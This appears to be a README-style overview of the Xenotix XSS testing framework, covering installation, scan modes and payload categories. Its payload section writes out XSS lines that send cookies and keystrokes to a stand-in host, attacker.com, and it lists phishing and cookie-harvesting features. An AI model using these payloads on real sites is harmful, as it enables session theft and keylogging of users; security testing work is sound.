# Xenotix XSS Exploit Framework

Advanced XSS vulnerability detection and exploitation framework with GUI interface.

## Installation

```bash
# Download from GitHub releases
wget https://github.com/ajinabraham/Xenotix-XSS-Exploit-Framework/archive/master.zip
unzip master.zip
cd Xenotix-XSS-Exploit-Framework-master

# Install Python dependencies
pip install -r requirements.txt

# Start application
python XenotixXSSExploitFramework.py
```

## Core Features

### Manual Testing Mode
- Single URL vulnerability assessment
- Custom payload injection
- Response analysis tools
- Screenshot capture

### Auto Scan Mode
- Automated vulnerability discovery
- Multiple injection point testing
- Bulk URL processing
- Comprehensive reporting

## Payload Categories

### Basic XSS Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Advanced Payloads
```javascript
// DOM manipulation
<script>document.body.innerHTML='<h1>XSS</h1>'</script>

// Cookie theft
<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log.php?key='+e.key}</script>
```

### Bypass Techniques
```javascript
// Encoding bypass
&#60;script&#62;alert('XSS')&#60;/script&#62;

// Case variation
<ScRiPt>alert('XSS')</ScRiPt>

// Event handler abuse
<input onfocus=alert('XSS') autofocus>
```

## Exploitation Features

### Cookie Harvesting
Capture session cookies from vulnerable applications.

### Phishing Integration
Generate convincing phishing pages through XSS.

### BeEF Integration
Connect discovered XSS to Browser Exploitation Framework.

### Custom Exploit Generation
Create tailored exploits for specific vulnerabilities.

## Analysis Tools

### Response Analyzer
- HTTP response inspection
- Header analysis
- Content type detection
- Reflection point identification

### Payload Encoder
- URL encoding
- HTML entity encoding
- JavaScript encoding
- Base64 encoding

### Filter Bypass Generator
Automated bypass payload generation for common filters.

## Reporting Capabilities

### Vulnerability Reports
- Technical vulnerability details
- Proof-of-concept demonstrations
- Remediation recommendations
- Risk assessment metrics

### Export Options
- HTML reports
- XML data export
- CSV vulnerability lists
- PDF documentation

## Integration Features

- Burp Suite extension support
- OWASP ZAP integration
- Custom API endpoints
- Third-party tool compatibility

Educational framework for understanding XSS vulnerability classes and exploitation techniques.
